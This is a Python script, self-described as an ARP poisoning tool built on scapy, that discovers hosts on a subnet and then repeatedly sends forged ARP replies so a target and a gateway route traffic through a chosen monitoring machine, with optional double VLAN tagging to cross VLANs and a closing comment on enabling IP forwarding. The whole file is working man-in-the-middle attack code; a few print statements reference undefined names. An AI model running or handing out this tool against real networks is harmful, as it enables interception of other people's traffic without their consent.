import argparse
from scapy.all import *
import netifaces
from tabulate import tabulate
from netaddr import IPNetwork
import time


BRDCAST_MAC = "ff:ff:ff:ff:ff:ff"
ARP_DISCOVERY_DEF_TIMEOUT = 10
INVALID_VLAN_NO = -1


class NetworkUtility:


	@staticmethod
	def send_recv_arp_broadcast(ip_address, timeout_dura=ARP_DISCOVERY_DEF_TIMEOUT):
		""" Used within get_network_details
			for network discovery
		
		Args:
		    ip_address (str): IP address e.g 192.168.1.0
		    timeout_dura (int, optional): Description
		
		Returns:
		    TYPE: Description
		"""
		return srp(Ether(dst=BRDCAST_MAC)/ARP(op=1, pdst=ip_address), timeout=timeout_dura, verbose=False)

	@staticmethod
	def get_network_details(network, timeout_dura):
		ans, unans = NetworkUtility.send_recv_arp_broadcast(network, timeout_dura)
		for s, r in ans:
			r.show()
			print("-----")

		if (len(ans) > 0):
			tbl_data = [[rcv.sprintf(r"%ARP.psrc%"), rcv.sprintf(r"%Ether.src%")] for snd, rcv in ans]
			return tabulate(tbl_data, headers=['IP Address', 'MAC Address'])
		else:
			return None



class Poisoner:
	# https://tools.ietf.org/html/rfc5227#page-7
	
	# Minimum interval between defensive ARPs IS 10 seconds 
	# therefore we set the arp delay to 10 to reduce spamming of ARP.

	ARP_SEND_DELAY = 10
	IS_VALID_VLAN_NO = lambda self, x: 1 <= x <= 1001 or 1006 <= x <= 4094



	def __init__(self, target_ip, monitor_ip, gateway_ip, vlan_num_1, vlan_num_2):

		if (vlan_num_1 != INVALID_VLAN_NO) and (vlan_num_2 != INVALID_VLAN_NO):
			if not self.IS_VALID_VLAN_NO(int(vlan_num_1)) or not self.IS_VALID_VLAN_NO(int(vlan_num_2)):
				raise TypeError("VLAN Numbers can be only 1 - 1001 and 1006 - 4094")
						

		self.target_ip = target_ip
		self.monitor_ip = monitor_ip
		self.gateway_ip = gateway_ip

		self.vlan_num_1 = vlan_num_1
		self.vlan_num_2 = vlan_num_2		

		self.PKT_poison_1 = None
		self.PKT_poison_2 = None

		self.PKT_unpoison_1 = None
		self.PKT_unpoison_2 = None


	def _is_valid_vlans(self):
		return self.vlan_num_1 is not INVALID_VLAN_NO and self.vlan_num_2 is not INVALID_VLAN_NO

	def _double_tag_packet(self, packet):
		return Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/packet


	def _get_mac_from_ip(self, ip_address):
		# resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=3, verbose=False)
		resp, unans = NetworkUtility.send_recv_arp_broadcast(ip_address)
		for s,r in resp:
			return r[ARP].hwsrc
		return None

	# - hwsrc is the MAC corresponding to psrc, to update in the target's arp table
	# - pdst is where the ARP packet should go (target),
	# - psrc is the IP to update in the target's arp table,
	# - hwdst is the destination hardware address
	# 
	# 
	def _generate_poison_packets(self, target_mac, monitor_mac, gateway_mac):
		""" Generate two packets to conduct poisoning
			One packet each for target and gateway
		
		Args:
		    target_mac (TYPE): Description
		    monitor_mac (TYPE): Description
		    gateway_mac (TYPE): Description
		"""

		#Tell target Gateway IP has Monitor MAC!
		self.PKT_poison_1 = ARP(op=2, hwdst=target_mac, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=monitor_mac)

		#Tell gateway that target IP has Monitor MAC!
		self.PKT_poison_2 = ARP(op=2, hwdst=gateway_mac, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=monitor_mac)

		if self._is_valid_vlans():
			self.PKT_poison_1 = self._double_tag_packet(self.PKT_poison_1)
			self.PKT_poison_2 = self._double_tag_packet(self.PKT_poison_2)

		# self.PKT_poison_1.show()

	def _generate_unpoison_packets(self, target_mac, monitor_mac, gateway_mac):

		# Lie to target to make Gateway IP back to Gateway Mac :(
		self.PKT_unpoison_1 = ARP(op=2, hwdst=target_mac, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=gateway_mac)

		# Lie to target to make Target IP back to Target Mac :(
		self.PKT_unpoison_2 = ARP(op=2, hwdst=gateway_mac, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=target_mac)

		if self._is_valid_vlans():
			self.PKT_unpoison_1 = self._double_tag_packet(self.PKT_unpoison_1)
			self.PKT_unpoison_2 = self._double_tag_packet(self.PKT_unpoison_2) 	

		# self.PKT_unpoison_1.show()


	def run(self):
		""" Entry portion of Poisoning 
		"""
		target_mac = self._get_mac_from_ip(self.target_ip)

		""" Its named as gateway for user to visualise the
			redirection easier. It does not necessarily be
			the gateway. It can be another host
		"""
		gateway_mac = self._get_mac_from_ip(self.gateway_ip)

		# If monitoring IP is set to own computer, then get MAC differently
		if self.monitor_ip == get_if_addr(conf.iface):
			monitor_mac = get_if_hwaddr(conf.iface)
		else:
			monitor_mac = self._get_mac_from_ip(self.monitor_ip)
		

		if target_mac is None:
			print("No MAC found for {}.".format(target_ip))
		if monitor_mac is None:
			print("No MAC found for {}.".format(monitor_ip))
		if gateway_mac is None:
			print("No MAC found for {}.".format(gateway_ip))

		print("Target: {} , Monitor: {}, Gateway: {} ".format(target_mac, monitor_mac, gateway_mac))

		self._generate_poison_packets(target_mac, monitor_mac, gateway_mac)
		self._generate_unpoison_packets(target_mac, monitor_mac, gateway_mac)

		# sys.exit()
		try:
			#  Start poisoining
			print("spoofing...")
			while True:
				send(self.PKT_poison_1)
				send(self.PKT_poison_2)
				time.sleep(self.ARP_SEND_DELAY)
			
		except KeyboardInterrupt:
			# Unpoison if Ctrl-C 
			print("[*] Keyboard interupted... restoring ARP Cache")
			for i in range(5):
				send(self.PKT_unpoison_1)
				send(self.PKT_unpoison_2)			
			print("[*] Finished reseting gateway and target")



	# Poisoner._send_spoofed_grat_arp_packet(target_ip, target_mac, gateway_ip, monitor_mac, vlan1, vlan2)
	# Poisoner._send_spoofed_grat_arp_packet(gateway_ip, gateway_mac, target_ip, monitor_mac, vlan1, vlan2)

	@staticmethod
	def _send_spoofed_grat_arp_packet(target_ip, target_mac, table_ip, table_mac, vlan_1, vlan_2):
		# send(ARP(op=2, pdst=target_ip, psrc=table_ip, hwdst=table_mac))
		
		# pkt = Dot1Q(vlan=10)/Dot1Q(vlan=20)/ARP(op=2, pdst=target_ip, psrc=table_ip, hwsrc=table_mac)
		ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=table_ip, hwsrc=table_mac)
		ARP(op=2, hwdst=gateway_mac, pdst=gateway_ip, psrc=table_ip, hwsrc=table_mac)


		pkt_to_send = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=table_ip, hwsrc=table_mac)

		if vlan_1 != -1 and vlan_2 != -1:
			pkt_to_send = Dot1Q(vlan=vlan_1)/Dot1Q(vlan=vlan_2)/pkt_to_send


		# pkt_to_send.show()
		# sys.exit()
		# send(pkt_to_send)
		# send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, psrc=table_ip, hwsrc=table_mac))
		# send(ARP(op=2, pdst=target_ip, psrc=table_ip, hwsrc=table_mac))



class ArgParser(argparse.ArgumentParser):
	
	# Dont use 1002 to 1005 since they are reserved	
	IS_VALID_VLAN_NO = lambda self, x: 1 <= int(x) <= 1001 or 1006 <= int(x) <= 4094

	def error(self, message):
		sys.stderr.write('error: %s\n' % message)
		self.print_help()
		sys.exit(2)

	def __init__(self):
		self.parser = argparse.ArgumentParser(description="This is an ARP poisoning script")
		self.parser.add_argument('-l', dest='network', help='Lists all IP & MAC Addresses for particular subnet. E.g -l 192.168.1.0/24', action='store')		
		self.parser.add_argument('-P', dest='arp_poison', help='ARP Poisoning for network redirection and monitoring.', action='store_true')		
		self.parser.add_argument('-T', dest='target_ip', help='*For -P* Target\'s IP address.', action='store')
		self.parser.add_argument('-M', dest='monitoring_ip', help='*For -P* Monitoring PC\'s IP address.', action='store')
		self.parser.add_argument('-GW', dest='gateway_ip', help='*For -P* Gateway\'s IP address.', action='store')
		self.parser.add_argument('--vlan1', dest='vlan1_num', help='*For -P* Specify VLAN Number for first 802.1q TAG' , action='store')
		self.parser.add_argument('--vlan2', dest='vlan2_num', help='*For -P* Specify VLAN Number for second 802.1q TAG', action='store')

	def parse_arguments(self):

		args = self.parser.parse_args()

		if args.network:

			details = NetworkUtility.get_network_details(args.network, ARP_DISCOVERY_DEF_TIMEOUT)
			if details is None:
				print("[!] No network details found for {}".format(args.network))
			else:
				print(details)


		elif args.arp_poison:

			error_msg = "\n"
			if args.target_ip is None:
				error_msg += "[-T] is required\n"

			if args.monitoring_ip is None:
				error_msg += "[-M] Monitoring IP param is required\n"

			if args.gateway_ip is None:
				error_msg += "[-GW] Gateway is required\n"

			if args.vlan1_num is not None and args.vlan2_num is None:
				error_msg += "[--vlan2] Please specified vlan2 number\n"				

			if args.vlan1_num is  None and args.vlan2_num is not  None:
				error_msg += "[--vlan1] Please specified vlan1 number\n"

			if args.vlan1_num is not None and args.vlan2_num is not None:
				if not self.IS_VALID_VLAN_NO(args.vlan1_num):
					error_msg += "[--vlan1] Invalid VLAN Tag 1\n"

				if not self.IS_VALID_VLAN_NO(args.vlan2_num):
					error_msg += "[--vlan2] Invalid VLAN Tag 2\n"
					

			if error_msg != "\n":
				raise self.parser.error(error_msg)
			else:
				print("Correct", args.target_ip, args.monitoring_ip, args.gateway_ip)

				# try:
				if args.vlan1_num is not None and args.vlan2_num is not None:
					poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, args.vlan1_num, args.vlan2_num)
				else:
					poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, INVALID_VLAN_NO, INVALID_VLAN_NO)

				poison.run()
				# except Exception as e:
				# 	raise e
		else:
			self.parser.print_help()
			sys.exit(2)
		

if __name__=="__main__":

	A = ArgParser()
	A.parse_arguments()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward